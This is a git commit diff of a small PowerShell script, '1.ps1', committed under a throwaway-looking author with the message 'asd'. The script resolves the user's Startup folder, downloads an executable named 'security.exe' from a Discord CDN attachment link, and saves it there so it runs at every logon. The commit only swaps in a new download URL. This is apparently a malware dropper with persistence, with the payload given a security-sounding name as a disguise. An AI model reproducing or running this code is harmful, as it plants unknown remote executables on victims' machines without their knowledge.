a25e0b6dc0678183c5f83413cc3ad82367ff93a9
fingszag123 <likokir314@lassora.com>
2025-03-01 17:34:26 +0100

    asd

--- 1.ps1
+++ 1.ps1
@@ -1,5 +1,5 @@
 $startupFolder = [Environment]::GetFolderPath("Startup")
-$url = "https://cdn.discordapp.com/attachments/1209632213742657576/1345432952611274833/security.exe?ex=67c48794&is=67c33614&hm=33af143dd0a934bdd1c39431ca05a2cde5f3c97277bd40e01319e474675a0e18&"
+$url = "https://cdn.discordapp.com/attachments/1209633323912003637/1345433718365622295/security.exe?ex=67c4884b&is=67c336cb&hm=818e39b57e3684277db067c570fa1a0c4e721c1f9a2a79c498261c94843531fb&"
 $outputPath = Join-Path $startupFolder "security.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
